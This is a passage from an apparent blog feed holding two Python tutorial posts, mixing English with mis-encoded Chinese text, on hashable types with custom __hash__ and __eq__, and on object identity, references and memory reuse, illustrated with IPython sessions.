themselves), and <strong>their hash valueis derived from their <code>id()</code></strong>.</p><p>--From the <a href="https://docs.python.org/3/glossary.html">Pythonglossary</a></p></blockquote><h2 id="which-objects-are-hashable-and-which-are-not">Which Objects AreHashable and Which Are Not</h2><p>æˆ‘ä»¬çŸ¥é“ <code>set</code> çš„å…ƒç´ å’Œ <code>dict</code> çš„é”® key è¦æ±‚æ˜¯hashable çš„ï¼Œå› æ­¤æˆ‘é€šè¿‡äº† <code>set</code> æµ‹è¯•ï¼Œå¾—å‡ºå¦‚ä¸‹ç»“æœï¼š</p><p>Hashable data types: int, float, str, tuple, and NoneType. Unhashabledata types: dict, list, and set.</p><p>æµ‹è¯•è¿‡ç¨‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: test_set=<span class="built_in">set</span>()</span><br><span class="line">In [<span class="number">2</span>]: test_set.add(<span class="literal">None</span>)</span><br><span class="line">In [<span class="number">3</span>]: test_set.add(<span class="number">1</span>)</span><br><span class="line">In [<span class="number">4</span>]: test_set.add(<span class="number">2.1</span>)</span><br><span class="line">In [<span class="number">5</span>]: test_set.add(<span class="literal">True</span>)</span><br><span class="line">In [<span class="number">6</span>]: test_set.add(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">In [<span class="number">7</span>]: test_set.add((<span class="string">&quot;name&quot;</span>, <span class="string">&quot;tel&quot;</span>))</span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: test_set.add(&#123;<span class="string">&quot;name&quot;</span>: <span class="number">123</span>&#125;)</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">TypeError                         Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">8</span>-9df12f1bbe21&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; <span class="number">1</span> test_set.add(&#123;<span class="string">&quot;name&quot;</span>: <span class="number">123</span>&#125;)</span><br><span class="line"></span><br><span class="line">TypeError: unhashable <span class="built_in">type</span>: <span class="string">&#x27;dict&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">9</span>]: test_set.add([<span class="number">1</span>,<span class="number">2</span>])</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">TypeError                         Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">9</span>-951f4013eb98&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; <span class="number">1</span> test_set.add([<span class="number">1</span>,<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">TypeError: unhashable <span class="built_in">type</span>: <span class="string">&#x27;list&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: test_set.add(&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;)</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">TypeError                         Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">11</span>-fa63e6bfd44d&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; <span class="number">1</span> test_set.add(&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;)</span><br><span class="line"></span><br><span class="line">TypeError: unhashable <span class="built_in">type</span>: <span class="string">&#x27;set&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="what-does-hashable-mean">What Does Hashable Mean</h2><p>Hashable: A characteristic of a Python object to indicate whether theobject has a hash value, which allows the object to serve as a key in adictionary or an element in a set.</p><p>Python å®ç°äº†å†…ç½®çš„ hash å‡½æ•°ï¼š<code>hash()</code>ï¼Œæ¥ç”Ÿæˆçš„å¯¹è±¡çš„hashã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">13</span>]: <span class="built_in">hash</span>(<span class="string">&quot;Hello&quot;</span>)</span><br><span class="line">Out[<span class="number">13</span>]: <span class="number">4478279774205738605</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">14</span>]: <span class="built_in">hash</span>([<span class="number">1</span>,<span class="number">2</span>])</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">TypeError                         Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">14</span>-9ce67481a686&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; <span class="number">1</span> <span class="built_in">hash</span>([<span class="number">1</span>,<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">TypeError: unhashable <span class="built_in">type</span>: <span class="string">&#x27;list&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="customize-hashability">Customize Hashability</h2><p>By default, all instances of custom classes will have a hash valuedefined at creation and it will not change over time. Two instances ofthe same class will have two different hash values.</p><p>You will see that the hash value that you get from your objectschanges every time you run the code. <strong>This is because the hash isderived from the object's id</strong>. Python, as expected, allows youto define your own hash value.</p><p>By default, custom class instances are compared by comparing theiridentities using the built-in id() function. That's why two object withthe same attribute value isn't the same one from the set or dictionariesperspective.</p><p>ç»“è®ºï¼š Dictionaries and set check two things: <strong>the hashvalue</strong>(The return value of <code>self.__hash__</code>) and<strong>the equality</strong>(<code>self.__eq__</code>)</p><p>å®éªŒï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name ,ssn</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.ssn = ssn</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;name: <span class="subst">&#123;self.name&#125;</span>, ssn: <span class="subst">&#123;self.ssn&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__hash__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;__hash__ is called&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hash</span>((self.name, self.ssn))</span><br><span class="line"></span><br><span class="line">p0 = Person(<span class="string">&quot;Jon Smith&quot;</span>, <span class="string">&quot;123456&quot;</span>)</span><br><span class="line">p1 = Person(<span class="string">&quot;Jon Smith&quot;</span>, <span class="string">&quot;123456&quot;</span>)</span><br><span class="line"></span><br><span class="line">persons = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">persons.add(p0)</span><br><span class="line"><span class="built_in">print</span>(persons)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&quot;</span>*<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">persons.add(p1)</span><br><span class="line"><span class="built_in">print</span>(persons)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&quot;</span>*<span class="number">20</span>)</span><br></pre></td></tr></table></figure><p>æ— è®ºæœ‰æ—  <code>__hash__()</code>æ—¶ï¼Œç»“æœéƒ½ä¸ºï¼šé›†åˆå°†ä¸¤ä¸ªç›¸åŒå±æ€§å€¼çš„å¯¹è±¡çœ‹ä½œæ˜¯ä¸åŒçš„å¯¹è±¡ã€‚</p><p>ä»ä¸‹é¢ç»“æœå¯ä»¥çœ‹å‡ºã€‚ <code>set</code> é€šè¿‡æ‰§è¡Œ<code>__hash__()</code> æ£€æŸ¥äº†å¯¹è±¡çš„ hash</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># violetv at manjaro in ~/test [21:03:54]</span></span><br><span class="line">$ python hashable.py</span><br><span class="line">__hash__ <span class="keyword">is</span> called</span><br><span class="line">&#123;name: Jon Smith, ssn: <span class="number">123456</span>&#125;</span><br><span class="line">--------------------</span><br><span class="line">__hash__ <span class="keyword">is</span> called</span><br><span class="line">&#123;name: Jon Smith, ssn: <span class="number">123456</span>, name: Jon Smith, ssn: <span class="number">123456</span>&#125;</span><br><span class="line">--------------------</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬åœ¨ä¸Šè¿°ä»£ç çš„å¯¹è±¡ä¸­æ·»åŠ äº† <code>__eq__()</code>å‡½æ•°ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°äº† set å·²ç»å°†ä¸¤ä¸ªå¯¹è±¡è¯†åˆ«ä¸ºä¸€ä¸ªäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;__eq__ is called&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        self.__<span class="keyword">class</span> == other.__class__ <span class="keyword">and</span></span><br><span class="line">        self.name == other.name <span class="keyword">and</span></span><br><span class="line">        self.ssn == other.ssn</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ python hashable.py</span><br><span class="line">__hash__ <span class="keyword">is</span> called</span><br><span class="line">&#123;name: Jon Smith, ssn: <span class="number">123456</span>&#125;</span><br><span class="line">--------------------</span><br><span class="line">__hash__ <span class="keyword">is</span> called</span><br><span class="line">__eq__ <span class="keyword">is</span> called</span><br><span class="line">&#123;name: Jon Smith, ssn: <span class="number">123456</span>&#125;</span><br><span class="line">--------------------</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><p><ahref="https://www.pythonforthelab.com/blog/what-are-hashable-objects/">Whatare Hashable Objects</a> &gt; <ahref="https://stackoverflow.com/questions/56154702/what-the-difference-between-hash-able-and-immutable">Whatthe difference between hash-able and immutable</a> &gt; <ahref="https://medium.com/better-programming/3-essential-questions-about-hashable-in-python-33e981042bcb">3Essential Questions About Hashable in Python</a> &gt; <ahref="https://docs.python.org/3/glossary.html">Python Glossary</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python Object Reference</title>
      <link href="/blog/2020/03/21/programming/python/1.basic/14.obj_reference/"/>
      <url>/blog/2020/03/21/programming/python/1.basic/14.obj_reference/</url>
      
        <content type="html"><![CDATA[<h2 id="objects-identity-type-and-value">Objects: Identity, Type, andValue</h2><p>ä½œä¸ºä¸€é—¨é¢å‘å¯¹è±¡çš„ç¼–ç¨‹è¯­è¨€ï¼ŒPythonä¸­çš„ä»»ä½•ä¸œè¥¿éƒ½æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ŒåŒ…æ‹¬å†…ç½®æ•°æ®ç±»å‹ï¼ˆå¦‚ï¼šæ•´å‹ï¼Œå­—ç¬¦ä¸²ï¼‰ï¼Œå‡½æ•°ï¼Œç±»ï¼Œç”šè‡³æ¨¡å—ã€‚</p><p>ä½†æ˜¯ï¼ŒPython ä¸­çš„å¯¹è±¡åˆ°åº•æ˜¯ä»€ä¹ˆå‘¢?ç®€è€Œè¨€ä¹‹ï¼Œå¯¹è±¡ç›¸å½“äºæ•°æ®å®¹å™¨ï¼Œå®ƒå½¢æˆäººä¸è®¡ç®—æœºä¹‹é—´çš„æ¥å£ã€‚ç¨‹åºå‘˜é€šè¿‡å†™ä»£ç æ¥ç›´æ¥æ“ä½œè¿™äº›å®¹å™¨ï¼Œä»è€Œä»¥æ¿€ç´ é‚£å‡ å¯ä»¥ç†è§£çš„æ–¹å¼å®ç°ä¸€å®šçš„åŠŸèƒ½ã€‚</p><ul><li><p>Identityå¯¹è±¡æ˜¯å†…å­˜æŸä¸ªåœ°æ–¹æ•°æ®å—ã€‚åœ¨å¤§å¤šæ•°ç¼–ç¨‹è¯­è¨€ï¼ˆåŒ…æ‹¬ï¼šPythonï¼‰ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨è¿™äº›æ•°æ®å—çš„å†…å­˜åœ°å€æ¥æ ‡è¯†å¯¹è±¡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹è±¡çš„å†…å­˜åœ°å€è¡¨å¾ä¸€ä¸ªå¯¹è±¡çš„èº«ä»½ã€‚åœ¨ CPython å®ç°ä¸­ï¼Œå†…ç½®å‡½æ•° <code>id()</code>è¿”å›å¯¹è±¡çš„å†…å­˜åœ°å€ã€‚</p></li><li><p>Type å½“å¯¹è±¡è¢«åˆ›å»ºæ—¶ï¼Œå®ƒçš„ç±»å‹ä¹Ÿåœ¨å†…å­˜ä¸­è¢«å®šä¹‰å’Œè®¾ç½®äº†ã€‚ä»å†…å­˜æ•°æ®å—çš„è§’åº¦æ¥è¯´ï¼Œå½“æŸä¸ªå†…å­˜å—è¢«ç»‘å®šåˆ°å¯¹è±¡æ—¶ï¼Œä¸ä»…ä»…å®ƒçš„æ ‡è¯†ç¬¦ï¼ˆèº«ä»½ï¼‰è¢«åˆ›å»ºäº†ï¼Œè€Œä¸”ä»–çš„ç±»å‹(ä¾‹å¦‚ï¼Œæ•´æ•°ï¼Œå­—ç¬¦ä¸²)ä¹Ÿè¢«åˆ›å»ºäº†ã€‚</p><p>python ä¸­æä¾›å†…ç½®å‡½æ•°çš„ <code>type()</code>æ¥åˆ¤æ–­å¯¹è±¡çš„ç±»å‹ã€‚</p></li><li><p>Valueå¯¹è±¡å¯ä»¥å–çš„å€¼ç”±å…¶ç±»å‹å†³å®šã€‚ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ªå¯¹è±¡çš„ç±»å‹æ˜¯æ•´æ•°ï¼Œå®ƒå°±ä¸èƒ½ä¿å­˜ dictionary ç±»å‹çš„æ•°æ®ï¼Œåä¹‹äº¦ç„¶ã€‚</p></li></ul><h2 id="why">WHYï¼Ÿ</h2><p>é¦–å…ˆï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‰æ®µä»£ç ï¼Œå¹¶æ ¹æ®ä»£ç ï¼Œå°è¯•æ€è€ƒæˆ‘æå‡ºçš„å‡ ä¸ªé—®é¢˜ï¼Œå¦‚æœä½ éƒ½èƒ½ç»™å‡ºè§£ç­”ï¼Œé‚£å°±ä¸ç”¨çœ‹æœ¬æ–‡äº†ï¼Œå¦‚æœä¸ç†è§£ï¼Œè¯·ç»§ç»­å¾€ä¸‹çœ‹ã€‚</p><ol start="0" type="1"><li><p>åˆ†åˆ«åˆ›å»ºä¸¤ä¸ªå…·æœ‰ç›¸åŒå€¼çš„å¯¹è±¡ä¸åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åé‡‡ç”¨èµ‹å€¼åˆ›å»ºå¦ä¸€ä¸ªå¯¹è±¡æœ‰åŒºåˆ«å—ï¼Ÿå³ï¼š ä»¥ä¸‹çš„ a, b c ä¸€æ ·å—ï¼Ÿ</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">3</span>]: a=[<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">In [<span class="number">4</span>]: b=[<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">In [<span class="number">5</span>]: c=a</span><br></pre></td></tr></table></figure></p><p>çŸ¥è¯†ç‚¹ï¼š å¯¹ Python ä¸­å˜é‡ï¼Œå¯¹è±¡åŠå¯¹è±¡å¼•ç”¨çš„ç†è§£</p></li><li><p>åˆ†åˆ«åˆ›å»ºä¸¤ä¸ªå…·æœ‰ç›¸åŒå€¼çš„å¯¹è±¡ï¼Œä¸ºä»€ä¹ˆå¯¹è±¡çš„ <code>id</code>æ—¶è€Œç›¸åŒï¼Œæ—¶è€Œä¸åŒï¼Ÿ çŸ¥è¯†ç‚¹ï¼š Python å†…å­˜ç®¡ç†</p></li><li><p>é‡‡ç”¨å˜é‡èµ‹å€¼çš„æ–¹å¼åˆ›å»ºå¦ä¸€ä¸ªå¯¹è±¡æƒ…å†µä¸‹ï¼Œä¸ºä½•æœ‰äº›æ•°æ®ç±»å‹ï¼Œæ”¹å˜å¦ä¸€ä¸ªå¯¹è±¡çš„å€¼ä¹‹åï¼Œå¦ä¸€ä¸ªå¯¹è±¡çš„ï¼Œid ä»ç„¶ä¸å˜ï¼Œæœ‰çš„ id å´å˜äº†ï¼ŸçŸ¥è¯†ç‚¹: å¯¹è±¡å¯å˜æ€§ä¸å¯¹è±¡å¼•ç”¨</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">11</span>]: a=<span class="number">257</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">12</span>]: b=<span class="number">257</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">13</span>]: <span class="built_in">id</span>(a), <span class="built_in">id</span>(b)</span><br><span class="line">Out[<span class="number">13</span>]: (<span class="number">140448785920880</span>, <span class="number">140448785920656</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">14</span>]: a=<span class="number">256</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">15</span>]: b=<span class="number">256</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">16</span>]: <span class="built_in">id</span>(a), <span class="built_in">id</span>(b)</span><br><span class="line">Out[<span class="number">16</span>]: (<span class="number">140448908007520</span>, <span class="number">140448908007520</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## list å¯å˜ç±»å‹</span></span><br><span class="line">In [<span class="number">1</span>]: list_a = [<span class="number">1</span>,<span class="number">2</span>,<span class="string">&quot;hello&quot;</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: list_b = [<span class="number">1</span>,<span class="number">2</span>,<span class="string">&quot;hello&quot;</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: <span class="built_in">id</span>(list_a), <span class="built_in">id</span>(list_b)</span><br><span class="line">Out[<span class="number">3</span>]: (<span class="number">139867441284480</span>, <span class="number">139867441621120</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: list_c = list_a</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: <span class="built_in">id</span>(list_a), <span class="built_in">id</span>(list_c)</span><br><span class="line">Out[<span class="number">5</span>]: (<span class="number">139867441284480</span>, <span class="number">139867441284480</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: list_c.append(<span class="string">&quot;World&quot;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: <span class="built_in">id</span>(list_a), <span class="built_in">id</span>(list_c)</span><br><span class="line">Out[<span class="number">7</span>]: (<span class="number">139867441284480</span>, <span class="number">139867441284480</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: <span class="built_in">print</span>(<span class="string">f&quot;list_a: <span class="subst">&#123;list_a&#125;</span>\nlist_c: <span class="subst">&#123;list_c&#125;</span>&quot;</span>)</span><br><span class="line">list_a: [<span class="number">1</span>, <span class="number">2</span>, <span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;World&#x27;</span>]</span><br><span class="line">list_c: [<span class="number">1</span>, <span class="number">2</span>, <span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;World&#x27;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># int ä¸å¯å˜ç±»å‹</span></span><br><span class="line">In [<span class="number">9</span>]: int_a = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">10</span>]: int_b = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: <span class="built_in">id</span>(int_a), <span class="built_in">id</span>(int_b)</span><br><span class="line">Out[<span class="number">11</span>]: (<span class="number">139867496413376</span>, <span class="number">139867496413376</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">12</span>]: int_c = int_a</span><br><span class="line"></span><br><span class="line">In [<span class="number">13</span>]: <span class="built_in">id</span>(int_a), <span class="built_in">id</span>(int_c)</span><br><span class="line">Out[<span class="number">13</span>]: (<span class="number">139867496413376</span>, <span class="number">139867496413376</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">14</span>]: int_c = <span class="number">12</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">15</span>]: <span class="built_in">id</span>(int_a), <span class="built_in">id</span>(int_c)</span><br><span class="line">Out[<span class="number">15</span>]: (<span class="number">139867496413376</span>, <span class="number">139867496413664</span>)</span><br></pre></td></tr></table></figure><h2 id="memory-management">Memory Management</h2><p>æ¯æ¬¡ä¸€ä¸ªæ–°çš„å¯¹è±¡åˆ›å»ºï¼Œå®ƒä¾¿ä¼šæœ‰ä¸€ä¸ªæ–°çš„å†…å­˜åœ°å€ï¼Œé™¤éå½“å®ƒæ˜¯</p><ul><li>ä¸€ä¸ªéå¸¸çŸ­çš„å­—ç¬¦ä¸²</li><li>ä¸€ä¸ªåœ¨ [-5ï¼Œ256] ä¹‹é—´çš„æ•´å‹</li><li>ä¸€ä¸ªç©ºçš„ä¸å¯å˜å®¹å™¨(ä¾‹å¦‚: tuple))</li></ul><h3 id="ç¤ºä¾‹">ç¤ºä¾‹</h3><ol type="1"><li><p>æ–°å†…å­˜åœ°å€ æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª L1 åˆ—è¡¨ï¼Œç„¶åå†åˆ›å»ºä¸€ä¸ªæ–°çš„åˆ—è¡¨ L2æ¥å¼•ç”¨å’Œ L1 ç›¸åŒçš„å€¼ï¼Œé‚£ L2 å¯¹åº”çš„å¯¹è±¡å°†æœ‰ä¸€ä¸ªæ–°çš„å†…å­˜ã€‚</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>L1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(L1)</span><br><span class="line"><span class="number">3061530120</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>L2 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(L2)</span><br><span class="line"><span class="number">3061527304</span></span><br></pre></td></tr></table></figure></p></li><li><p>ç›¸åŒçš„å†…å­˜åœ°å€</p><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªæ•´å‹å¯¹è±¡çš„ä¾‹å­ï¼Œ x å’Œ y éƒ½å¼•ç”¨å¯¹è±¡ 10ã€‚åœ¨ä¹‹å‰çš„ä¾‹å­ä¸­ L1å’Œ L2 å†…å­˜åœ°å€ä¸åŒï¼Œè€Œ x å’Œ y å¼•ç”¨çš„å¯¹è±¡å…±äº«ç›¸åŒçš„å†…å­˜åœ°å€ã€‚</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = <span class="number">10</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>y = <span class="number">10</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(x)</span><br><span class="line"><span class="number">2301840</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(y)</span><br><span class="line"><span class="number">2301840</span></span><br></pre></td></tr></table></figure></p><p>è¿™æ˜¯å› ä¸ºï¼Œåœ¨è¿™ä¸‰ä¸ªæƒ…å†µä¸­ï¼ŒPythoné€šè¿‡è®©ç¬¬äºŒä¸ªå˜é‡å¼•ç”¨å†…å­˜ä¸­ç›¸åŒçš„å¯¹è±¡æ¥ä¼˜åŒ–å†…å­˜ï¼Œæœ‰çš„æŠŠå®ƒå«åš "sharedobjectâ€</p></li></ol><h2 id="variables">Variables</h2><ul><li>å˜é‡å’Œæ•°æ®(å¯¹è±¡)éƒ½æ˜¯ä¿å­˜åœ¨å†…å­˜ä¸­çš„</li><li>åœ¨ Python ä¸­å‡½æ•°çš„å‚æ•°ä¼ é€’ä»¥åŠè¿”å›å€¼éƒ½æ˜¯é å¯¹è±¡å¼•ç”¨(object reference)ä¼ é€’çš„</li></ul><h3 id="variable-assignment">Variable Assignment</h3><blockquote><p>Assignment statements in Python do not copy objects, they createbindings between a target and an object.</p></blockquote><p>That means when we create a variable by assignment, the new variablerefers to the same object as the original variable does.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>A = [<span class="number">1</span>, <span class="number">2</span>, [<span class="number">10</span>, <span class="number">11</span>], <span class="number">3</span>, [<span class="number">20</span>, <span class="number">21</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>B = A</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(A)</span><br><span class="line"><span class="number">3061527080</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(B)</span><br><span class="line"><span class="number">3061527080</span></span><br></pre></td></tr></table></figure><p>Because the new variable B and the original variable A share the sameobject (i.e. the same list), they also contain same elementsã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(A[<span class="number">2</span>])</span><br><span class="line"><span class="number">3061527368</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(B[<span class="number">2</span>])</span><br><span class="line"><span class="number">3061527368</span></span><br></pre></td></tr></table></figure><p>As illustrated in the figure below, A and B share the same id, i.e.,they refer to the same object in memory. And they contain the sameelements as 